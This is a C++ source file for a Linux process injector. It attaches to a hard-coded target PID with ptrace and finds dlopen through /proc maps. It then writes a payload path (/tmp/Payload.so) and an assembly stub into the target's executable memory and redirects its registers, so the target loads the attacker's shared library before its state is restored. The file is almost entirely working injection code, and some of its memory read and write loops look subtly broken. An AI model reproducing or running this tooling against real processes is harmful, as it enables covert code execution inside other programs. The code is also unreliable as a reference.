#include "Injection.h"

//void* PayloadPath = (void *) "/home/kourosh/CLionProjects/ProcessInjectorLinux/Payload.so";

int main() {

    void* libdlAddr = nullptr;
    void* localLibdlAddress = nullptr;
    void* remoteLibdlAddress = nullptr;
    void* localDlopenAddress = nullptr;
    void* remoteDlopenAddress = nullptr;

    pid_t PID = 27067;

    // Load libdl-2.27 in out process
    libdlAddr = dlopen("libdl-2.27.so", RTLD_LAZY);
    if (!libdlAddr){
        printf("Error opening libdl-2.27\n");
        return -1;
    }

//    sleep(2);
    printf("[+] libdl-2.27.so loaded at %p\n", (void*)libdlAddr);

    // Find address of dlopen()
    localDlopenAddress = dlsym((void*)(libdlAddr), "dlopen");
    if (!localDlopenAddress){
        printf("Error retrieving address of dlopen!\n");
        return -1;
    }
//    sleep(2);
    printf("[+] dlopen() found at address %p\n", (void*)localDlopenAddress);

    // WTF ?? localLibdlAddress and libdlAddr are not equal !!!
    localLibdlAddress = FindLibraryAddress(-1, "libdl-2.27.so");
//    sleep(2);
    printf("[+] libdl-2.27.so located at %p with maps file\n", localLibdlAddress);

    // Find libdl-2.27.so address in target process
    remoteLibdlAddress = FindLibraryAddress(PID, "libdl-2.27.so");
//    sleep(2);
    printf("[+] libdl-2.27.so located in process %d at address %p\n", PID, remoteLibdlAddress);

    remoteDlopenAddress = (void*)(
            (unsigned long long)remoteLibdlAddress + (
                    (unsigned long long)localDlopenAddress - (unsigned long long)localLibdlAddress
            )
        );

//    sleep(2);
    printf("[+] dlopen() offset in libdl found to be %p bytes\n", (void*)((unsigned long long)libdlAddr - (unsigned long long)localLibdlAddress));
//    sleep(2);
    printf("[+] dlopen() in target process at address %p\n", remoteDlopenAddress);

    Inject(PID, remoteDlopenAddress);

    return 0;
}

void* FindLibraryAddress(pid_t PID, const char* LibraryName){

    char mapFileName[1024];
    char buffer[2048];
    unsigned long long libAddr;


    if (PID == -1){
        snprintf(mapFileName, sizeof(mapFileName), "/proc/self/maps");
    }else{
        snprintf(mapFileName, sizeof(mapFileName), "/proc/%d/maps", PID);
    }

    FILE* fd = fopen(mapFileName, "r");

    while (fgets(buffer, sizeof(buffer), fd)){
        if (strstr(buffer, LibraryName)){
            libAddr = strtoull(buffer, NULL, 16);
//            printf("%p\n", (void*)libAddr);
            return (void*)libAddr;
        }
    }

//    return (void*)(libAddr);


}



bool Inject(pid_t PID, void* dlopenAddr){

    struct user_regs_struct OldRegs{}, regs{};
    int status;

    printf("[+] Tracing process with PID: %d\n", PID);
    sleep(2);

    if(ptrace(PTRACE_ATTACH, PID, NULL, NULL) < 0){
        perror("ptrace(ATTACH):");
        return -1;
    }

    printf("[+] Getting Registers\n");
    sleep(2);

    if(ptrace(PTRACE_GETREGS, PID, NULL, &OldRegs) < 0){
        perror("ptrace(GETREGS):");
        return -1;
    }

    memcpy(&regs, &OldRegs, sizeof(user_regs_struct));

    int oldCodesSize = 9076;
    unsigned char* oldCodes = (unsigned char*)malloc(oldCodesSize);

    void* freeAddress = FindExecutableSpace(PID);

    if (!ReadFromTargetMemory(PID, (unsigned long long)dlopenAddr, oldCodes, oldCodesSize)){
        printf("ReadFromMemory failed!\n");
        return false;
    }

    WriteToMemory(PID, (unsigned long long)freeAddress, (void*)"/tmp/Payload.so\x00", 24);
    WriteToMemory(PID, (unsigned long long)freeAddress + 24, (void*)"\x90\x90\x90\x90\x90\x90\x90", 8);
    WriteToMemory(PID, (unsigned long long)freeAddress + 24 + 8, (long*)(&injectme) + 4, 32);

    // Set rip to point to our code
    regs.rip = (unsigned long long) freeAddress + 24 + 8;

    // Set rax to point to API call dlopen() address
    regs.rax = (unsigned long long) dlopenAddr;

    // Set rdi to point to our payload path
    regs.rdi = (unsigned long long) freeAddress;

    // Set rsi as RTLD_LAZY for dlopen() call
    regs.rsi = 2;

    // Set new regs in target process
    ptrace(PTRACE_SETREGS, PID, NULL, &regs);

    ptrace(PTRACE_CONT, PID, NULL, NULL);
    waitpid(PID, &status, WUNTRACED);

    if (WIFSTOPPED(status) && WSTOPSIG(status) ==SIGTRAP){

        // Get process Registers, if injection succeed or not
        ptrace(PTRACE_GETREGS, PID, NULL, &regs);
        if ( regs.rax != 0x0 ){
            printf("[*] Injected payload loaded at address: %p", (void*)regs.rax);
        } else{
            printf("[!] Payload could not be injected\n");
            return false;
        }

        // Restore target program back to original state
        // Copy old code back to target process memory
        WriteToMemory(PID, (unsigned long long)freeAddress, oldCodes, 8192);

        // Set old registers
        ptrace(PTRACE_SETREGS, PID, NULL, &OldRegs);

        //
        printf("[+] Detaching target process\n");

        if( ptrace(PTRACE_DETACH, PID, NULL, NULL) < 0){
            perror("ptrace(DETACH)");
            return -1;
        }
    } else {
        printf("[!] Fatal Error: Process stopped for unknown reason!");
        return false;
    }

//    printf("%d\n", getpid());
//    sleep(2000);

    return true;
}

bool ReadFromTargetMemory(pid_t PID, unsigned long long addr, void* data, int len){

    char* ptr = (char*) data;
    long word = 0;

    for (int i = 0; i < len; i += sizeof(word), word=0){
        if ((word = ptrace(PTRACE_PEEKTEXT, PID, addr + i, NULL)) == -1){
            printf("Error reading from addr %p\n", (void*)(addr+i) );
            ptrace(PTRACE_DETACH, PID, NULL, NULL);
            return false;
        }

        ptr[i] = word;
        printf("%d) read from address %p : %p\n", i, (void*)(addr+i), (void*)word);

    }

    return true;

}

bool WriteToMemory(pid_t PID, unsigned long long addr, void* data, int len){

    long word;

    for (int i = 0; i < len; i += sizeof(word), word = 0){
        memcpy(&word, (long*)data + i, sizeof(word));
        if (ptrace(PTRACE_POKETEXT, PID, addr + i, word) == -1){
            printf("Error writing data to address %p\n", (addr+i));
            return false;
        }
    }
    return true;

}

void* FindExecutableSpace(pid_t PID){

    char filename[128];
    char buffer[1024];
    char perms[5];
    char str[20];

    void* address = nullptr;

    sprintf(filename, "/proc/%d/maps", PID);

    FILE* fd = fopen(filename, "r");

    while (fgets(buffer, sizeof(buffer), fd)){
        sscanf(buffer, "%lx-%*lx %s %*s %s %*d", &address, perms, str);

        if(strstr(perms, "x")) break;
        sleep(1);
    }

    fclose(fd);

    printf("free address : %p\n", (void*)address);
    return address;

}

void injectme(void){
    asm("mov $2, %esi\n"
        "call *%rax\n"
        "int $0x03\n"
    );
}
